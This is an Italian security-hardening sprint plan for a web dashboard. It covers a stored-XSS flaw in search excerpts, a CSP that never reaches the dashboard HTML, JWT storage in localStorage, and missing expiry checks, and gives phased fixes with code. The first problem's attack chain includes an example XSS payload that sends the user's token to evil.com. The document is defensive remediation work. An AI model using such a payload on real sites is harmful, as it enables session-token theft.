# Sprint: Security Hardening

Questo documento copre tutti i problemi di sicurezza emersi dall'analisi del flow di autenticazione e della superficie XSS della dashboard. Le fasi sono ordinate per impatto/urgenza: la Fase 1 è bloccante, le successive sono miglioramenti strutturali.

---

## Contesto e problemi identificati

### Problema 1 — Stored XSS → token theft (CRITICO)

**File:** `apps/dashboard/src/features/command-palette/_parts/search-results-view.tsx:80`

```tsx
dangerouslySetInnerHTML={{ __html: entry.excerpt }}
```

`entry.excerpt` viene da `search-utils.ts:150` tramite SQLite FTS5 `snippet()`, che estrae frammenti dal campo `body` dei contenuti (richtext = HTML grezzo). FTS5 non sanitizza.

**Attack chain concreta:**
1. Un admin salva in un campo richtext: `testo <img src=x onerror="fetch('https://evil.com/?t='+localStorage.getItem('beech_token'))">`
2. Il contenuto viene indicizzato in FTS con l'HTML grezzo
3. Un altro admin cerca "testo" nella command palette
4. `snippet()` restituisce il frammento con il payload XSS
5. `dangerouslySetInnerHTML` lo renderizza nel DOM
6. Token JWT rubato → attaccante ha 15 minuti per agire

### Problema 2 — CSP non copre la dashboard HTML (ALTO)

**File:** `apps/api/src/factory.ts:119-126`

Il middleware CSP esegue `c.header('Content-Security-Policy', ...)` dopo `next()`, ma la route `/admin/*` restituisce un oggetto `Response` immutabile da `c.env.ASSETS.fetch()`. Hono non può mutare gli header di una Response immutabile → **il CSP non raggiunge l'HTML della dashboard**.

La CSP viene applicata solo alle risposte JSON dell'API, non alle pagine HTML dove vive il token in localStorage.

### Problema 3 — JWT in localStorage (MEDIO)

**File:** `apps/dashboard/src/lib/api.ts:13`, `apps/dashboard/src/components/login-form/use-login-form.ts:88`

```ts
export const AUTH_TOKEN_KEY = 'beech_token';
localStorage.setItem(AUTH_TOKEN_KEY, data.token)
```

`localStorage` è accessibile a qualsiasi script. Il TODO esistente nel codice cita la CSP come mitigation, ma la CSP non funziona (Problema 2). L'approccio sicuro è tenere il token in memoria JS (variabile di modulo) invece che in storage persistente.

**Nota:** il refresh token è già correttamente in `HttpOnly` cookie — solo l'access token va spostato.

### Problema 4 — `ProtectedRoute` non valida scadenza (BASSO)

**File:** `apps/dashboard/src/App.tsx:38-43`

```ts
const hasToken = typeof window !== "undefined" && localStorage.getItem(AUTH_TOKEN_KEY)
```

Controlla solo la presenza del token, non la scadenza (`exp`). Token scaduto → route passa → prima API call → 401 → refresh silenzioso. Funziona ma genera sempre una request fallita prima di recuperarsi.

### Problema 5 — `getStoredUser()` non controlla `exp` (BASSO)

**File:** `apps/dashboard/src/lib/api.ts:128-141`

Decodifica il JWT payload senza verificare `payload.exp`. Se il token è scaduto, restituisce comunque `email`/`name` per la UI.

---

## Fase 1 — Fix immediati (XSS + CSP)

Priorità massima. Nessun refactor architetturale, modifiche chirurgiche.

### 1.1 — Elimina `dangerouslySetInnerHTML` dal search excerpt

**File:** `apps/dashboard/src/features/command-palette/_parts/search-results-view.tsx`

Rimuovere `dangerouslySetInnerHTML`. Renderizzare l'excerpt come testo plain con highlight manuale dei match tramite split su `<mark>` / `</mark>`.

```tsx
// Invece di:
<span dangerouslySetInnerHTML={{ __html: entry.excerpt }} />

// Usa una funzione che splitta su <mark>...</mark> e renderizza span React:
function renderExcerpt(raw: string) {
  // Strippa tutti i tag HTML tranne <mark> prima di elaborare
  // Poi splitta e renderizza con <mark> come tag React sicuro
}
```

- [x] Implementare `renderExcerpt()` che stripa HTML e preserva solo `<mark>` per l'highlighting
- [x] Sostituire `dangerouslySetInnerHTML` con `{renderExcerpt(entry.excerpt)}`

### 1.2 — Strip HTML dal body FTS all'indicizzazione (defense in depth)

**File:** `apps/api/src/search-utils.ts` — `mapFtsRow()`

> **Nota implementativa:** FTS è popolata via trigger SQLite (`fts_${slug}_insert/update`) che leggono direttamente da `new.{col}` — impossibile intervenire a livello di trigger senza migration. Strip applicato nell'unico punto API controllabile: `mapFtsRow()` prima che il dato esca nella response. `<mark>` preservato per l'highlighting di `snippet()`.

- [x] Identificare il punto di scrittura FTS nell'API (trigger SQLite generati da `generateFtsTriggers` in `packages/core/src/engine.ts`)
- [x] Applicare `stripHtmlPreserveMark()` all'excerpt in `mapFtsRow()` — HTML non raggiunge mai il client
- [ ] *(future)* Rimuovere trigger e fare FTS sync manuale con testo plain per ripulire anche i dati indicizzati

### 1.3 — Fix CSP per la dashboard HTML

**File:** `apps/api/src/factory.ts:276-284`

Wrappare la response di ASSETS in una nuova Response con gli header di sicurezza aggiunti manualmente.

```ts
app.get('/admin/*', async (c) => {
  if (!c.env.ASSETS) {
    return c.text('Dashboard not configured.', 503)
  }

  const assetRequest = c.req.raw
  let response = await c.env.ASSETS.fetch(assetRequest)

  if (response.status === 404) {
    response = await c.env.ASSETS.fetch(
      new Request(new URL('/admin/index.html', c.req.url))
    )
  }

  // Nuova Response con header di sicurezza (immutabile → va wrappata)
  const newHeaders = new Headers(response.headers)
  newHeaders.set('Content-Security-Policy',
    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https:; connect-src 'self'; frame-ancestors 'none'"
  )
  newHeaders.set('X-Frame-Options', 'DENY')
  newHeaders.set('X-Content-Type-Options', 'nosniff')
  newHeaders.set('Referrer-Policy', 'strict-origin-when-cross-origin')

  return new Response(response.body, {
    status: response.status,
    headers: newHeaders,
  })
})
```

**Nota:** la CSP per la dashboard deve permettere `'unsafe-inline'` per gli stili di Vite/Tailwind in dev, ma in prod può essere più restrittiva. Valutare `nonce`-based CSP come step futuro.

- [x] Wrappare response ASSETS con nuova Response + header di sicurezza
- [ ] Verificare in prod che `Content-Security-Policy` sia presente nell'HTML response
- [x] Rimuovere le stesse intestazioni dal middleware globale per le route `/admin/*` (evitare duplicazione)

---

## Fase 2 — Fix `ProtectedRoute` e `getStoredUser()`

Modifiche rapide, nessuna dipendenza dalla Fase 3.

### 2.1 — Check scadenza in `ProtectedRoute`

**File:** `apps/dashboard/src/App.tsx`

```ts
function isTokenValid(token: string | null): boolean {
  if (!token) return false
  try {
    const payload = JSON.parse(atob(token.split('.')[1]))
    return typeof payload.exp === 'number' && payload.exp > Date.now() / 1000
  } catch {
    return false
  }
}

function ProtectedRoute({ children }: { children: React.ReactNode }) {
  const token = typeof window !== 'undefined' ? localStorage.getItem(AUTH_TOKEN_KEY) : null
  if (!isTokenValid(token)) {
    return <Navigate to="/login" replace />
  }
  return <>{children}</>
}
```

- [x] Aggiungere `isTokenValid()` in `api.ts` (o utility condivisa)
- [x] Usarla in `ProtectedRoute` invece di semplice presence check

### 2.2 — Check scadenza in `getStoredUser()`

**File:** `apps/dashboard/src/lib/api.ts:128`

```ts
export function getStoredUser(): { email: string; name?: string } | null {
  if (typeof window === 'undefined') return null
  const token = localStorage.getItem(AUTH_TOKEN_KEY)
  if (!token) return null
  try {
    const payload = JSON.parse(atob(token.split('.')[1]))
    if (typeof payload.exp === 'number' && payload.exp <= Date.now() / 1000) return null
    return {
      email: payload.email ?? '',
      name: payload.name ?? 'Admin',
    }
  } catch {
    return null
  }
}
```

- [x] Aggiungere guard su `payload.exp` in `getStoredUser()`

---

## Fase 3 — In-memory token (eliminazione localStorage per JWT)

Refactor architetturale. Richiede un `AuthContext` per gestire stato React + lifecycle del token.

### Obiettivo

Spostare l'access token da `localStorage` a una variabile di modulo JS. Inaccessibile tramite XSS. Al page reload, il token viene ripristinato via `/auth/refresh` (il refresh token in `HttpOnly` cookie viene inviato automaticamente).

### 3.1 — Creare `AuthContext`

**File nuovo:** `apps/dashboard/src/lib/auth-context.tsx`

```ts
type AuthStatus = 'loading' | 'authenticated' | 'unauthenticated'

interface AuthState {
  status: AuthStatus
  user: { email: string; name?: string } | null
  setToken: (token: string) => void
  clearToken: () => void
}
```

- [x] Creare `AuthProvider` con stato `{ status, user, _token }`
- [x] `setToken(token)`: salva `_token` in ref/variabile di modulo, decodifica payload, aggiorna `user`
- [x] `clearToken()`: azzera tutto, redirect a `/login`
- [x] Al mount: chiama `POST /auth/refresh` → se ok `setToken(newToken)`, se ko `status = 'unauthenticated'`
- [x] Esporre `useAuth()` hook

### 3.2 — Aggiornare `ProtectedRoute`

**File:** `apps/dashboard/src/App.tsx`

```tsx
function ProtectedRoute({ children }: { children: React.ReactNode }) {
  const { status } = useAuth()
  if (status === 'loading') return <SplashScreen />
  if (status === 'unauthenticated') return <Navigate to="/login" replace />
  return <>{children}</>
}
```

- [x] Aggiungere componente `SplashScreen` (loader minimo durante il refresh iniziale)
- [x] Aggiornare `ProtectedRoute` per usare `useAuth()`

### 3.3 — Aggiornare interceptor axios

**File:** `apps/dashboard/src/lib/api.ts`

- [x] Sostituire `localStorage.getItem(AUTH_TOKEN_KEY)` con `getAccessToken()` (funzione che legge la variabile di modulo)
- [x] Al refresh riuscito: chiamare `setAccessToken(newToken)` invece di `localStorage.setItem`
- [x] Al refresh fallito: chiamare `clearAccessToken()` invece di `localStorage.removeItem`
- [x] Rimuovere `AUTH_TOKEN_KEY` e ogni riferimento a `localStorage` per il token

### 3.4 — Aggiornare `useLoginForm`

**File:** `apps/dashboard/src/components/login-form/use-login-form.ts`

- [x] Dopo login OK: chiamare `auth.setToken(data.token)` invece di `localStorage.setItem`
- [x] Iniettare `useAuth()` nel hook o passare callback

### 3.5 — Aggiornare `getStoredUser()` → `useAuthUser()`

**File:** `apps/dashboard/src/lib/api.ts` + tutti i call site

`getStoredUser()` è una funzione sincrona chiamata in render (`app-sidebar.tsx:26`, `dashboard-page.tsx:16`). Con in-memory diventa `useAuth().user` (già disponibile nel context).

- [x] Sostituire `getStoredUser()` con `useAuth().user` nei componenti
- [x] Deprecare / rimuovere `getStoredUser()`

### 3.6 — Aggiornare `logout()`

**File:** `apps/dashboard/src/lib/api.ts`

- [x] `logout()` chiama `clearAccessToken()` invece di `localStorage.removeItem`

---

## Riepilogo priorità

| Fase | Effort | Impatto | Dipendenze |
|------|--------|---------|------------|
| 1.1 Fix `dangerouslySetInnerHTML` | Basso | Critico — chiude vettore XSS attivo | Nessuna |
| 1.2 Strip HTML in FTS | Basso | Alto — defense in depth | Nessuna |
| 1.3 Fix CSP dashboard | Medio | Alto — attiva mitigation già documentata | Nessuna |
| 2.1 `ProtectedRoute` exp check | Basso | Basso — UX improvement | Nessuna |
| 2.2 `getStoredUser()` exp check | Basso | Basso — correttezza display | Nessuna |
| 3.x In-memory token | Alto | Medio — rimuove XSS surface per localStorage | Fase 1 + Fase 2 |

**Ordine consigliato:** 1.1 → 1.2 → 1.3 → 2.x → 3.x
